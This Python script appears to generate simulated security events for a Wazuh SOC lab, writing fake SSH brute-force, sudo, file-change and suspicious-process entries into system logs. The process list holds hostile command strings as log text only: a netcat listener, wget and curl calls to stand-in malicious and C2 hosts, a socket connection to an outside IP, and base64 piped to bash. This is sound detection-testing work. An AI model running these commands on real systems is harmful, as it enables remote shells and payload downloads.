#!/usr/bin/env python3
"""
Simulates realistic security events on a Linux endpoint.
Generates syslog entries, auth logs, and file changes that
Wazuh agent picks up and forwards to the manager.
"""
import os
import time
import random
import subprocess
import logging
import threading
import requests
from datetime import datetime

SITE_ID = os.environ.get('SITE_ID', 'AUDIO_001')
ENDPOINT = os.environ.get('ENDPOINT_NAME', 'endpoint-01')
BACKEND_URL = os.environ.get('BACKEND_URL', 'http://soc-backend:5000')

# Simulated users
USERS = ['audioprothesiste', 'receptionist', 'admin_center', 'root']
FAKE_USERS = ['hacker', 'test', 'admin', 'support', 'backup']
FAKE_IPS = [
    '185.220.101.42', '91.240.118.172', '45.155.205.233',
    '194.26.29.120', '23.129.64.210', '171.25.193.78'
]
INTERNAL_IPS = ['192.168.1.10', '192.168.1.11', '192.168.1.50', '10.0.0.1']

logger = logging.getLogger('log-generator')
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')


def write_auth_log(message):
    """Write to /var/log/auth.log (monitored by Wazuh)."""
    timestamp = datetime.now().strftime('%b %d %H:%M:%S')
    entry = f"{timestamp} {ENDPOINT} {message}\n"
    with open('/var/log/auth.log', 'a') as f:
        f.write(entry)


def write_syslog(message):
    """Write to /var/log/syslog."""
    timestamp = datetime.now().strftime('%b %d %H:%M:%S')
    entry = f"{timestamp} {ENDPOINT} {message}\n"
    with open('/var/log/syslog', 'a') as f:
        f.write(entry)


def simulate_failed_login():
    """Simulate failed SSH/login attempts."""
    user = random.choice(FAKE_USERS)
    ip = random.choice(FAKE_IPS)
    port = random.randint(40000, 65000)
    write_auth_log(
        f"sshd[{random.randint(1000, 9999)}]: "
        f"Failed password for invalid user {user} from {ip} port {port} ssh2"
    )
    logger.info(f"[AUTH] Failed login: {user}@{ip}")


def simulate_successful_login():
    """Simulate successful login."""
    user = random.choice(USERS)
    ip = random.choice(INTERNAL_IPS)
    write_auth_log(
        f"sshd[{random.randint(1000, 9999)}]: "
        f"Accepted password for {user} from {ip} port 22 ssh2"
    )
    write_auth_log(
        f"sshd[{random.randint(1000, 9999)}]: "
        f"pam_unix(sshd:session): session opened for user {user}(uid=1000) by (uid=0)"
    )
    logger.info(f"[AUTH] Successful login: {user}@{ip}")


def simulate_sudo_event():
    """Simulate sudo usage."""
    user = random.choice(USERS[:3])
    commands = [
        'apt-get update', 'systemctl restart apache2',
        'cat /etc/shadow', 'chmod 777 /tmp/data',
        'useradd newuser', 'iptables -F'
    ]
    cmd = random.choice(commands)
    write_auth_log(
        f"sudo: {user} : TTY=pts/0 ; PWD=/home/{user} ; "
        f"USER=root ; COMMAND=/usr/bin/{cmd}"
    )
    logger.info(f"[SUDO] {user} ran: {cmd}")


def simulate_file_change():
    """Create/modify files in monitored directories to trigger FIM alerts."""
    target_dirs = ['/tmp']
    target = random.choice(target_dirs)
    filename = f"suspicious_{random.randint(1000, 9999)}.tmp"
    filepath = os.path.join(target, filename)

    with open(filepath, 'w') as f:
        f.write(f"Modified at {datetime.now().isoformat()}")

    logger.info(f"[FIM] File modified: {filepath}")

    # Clean up after a bit
    time.sleep(2)
    if os.path.exists(filepath):
        os.remove(filepath)


def simulate_process_event():
    """Simulate suspicious process activity via syslog."""
    processes = [
        'nmap -sS 192.168.1.0/24',
        'nc -lvp 4444',
        'wget http://malicious-site.com/payload.sh',
        'curl http://c2-server.evil/beacon',
        'python3 -c "import socket;socket.connect((\\"185.220.101.42\\",443))"',
        'base64 -d /tmp/encoded.b64 | bash',
    ]
    proc = random.choice(processes)
    pid = random.randint(1000, 50000)
    user = random.choice(USERS)
    write_syslog(
        f"audit[{pid}]: USER_CMD user={user} "
        f"exe=\"/usr/bin/{proc.split()[0]}\" command=\"{proc}\""
    )
    logger.info(f"[PROC] Suspicious process: {proc}")


def simulate_brute_force():
    """Simulate brute force attack - multiple failed logins from same IP."""
    ip = random.choice(FAKE_IPS)
    attempts = random.randint(5, 15)
    logger.info(f"[ATTACK] Brute force from {ip} - {attempts} attempts")
    for _ in range(attempts):
        user = random.choice(FAKE_USERS)
        port = random.randint(40000, 65000)
        write_auth_log(
            f"sshd[{random.randint(1000, 9999)}]: "
            f"Failed password for invalid user {user} from {ip} port {port} ssh2"
        )
        time.sleep(random.uniform(0.5, 2))


def _heartbeat():
    """Send a keepalive to the SOC backend every 5 minutes."""
    while True:
        time.sleep(300)
        try:
            requests.post(f"{BACKEND_URL}/api/ingest", json={
                "source": "endpoint",
                "event_type": "keepalive",
                "severity": "low",
                "description": f"Agent keepalive from {ENDPOINT}",
                "site_id": SITE_ID,
                "metadata": {}
            }, timeout=5)
        except Exception:
            pass


def main():
    """Main loop - generate events at random intervals."""
    logger.info(f"Starting log generator for {ENDPOINT} ({SITE_ID})")
    threading.Thread(target=_heartbeat, daemon=True).start()

    # Event weights (probability)
    events = [
        (simulate_failed_login, 30),
        (simulate_successful_login, 25),
        (simulate_sudo_event, 15),
        (simulate_file_change, 10),
        (simulate_process_event, 10),
        (simulate_brute_force, 5),
    ]

    # Build weighted list
    weighted = []
    for func, weight in events:
        weighted.extend([func] * weight)

    while True:
        event_func = random.choice(weighted)
        try:
            event_func()
        except Exception as e:
            logger.error(f"Error generating event: {e}")

        # Wait 10-60 seconds between events
        delay = random.uniform(10, 60)
        time.sleep(delay)


if __name__ == '__main__':
    main()
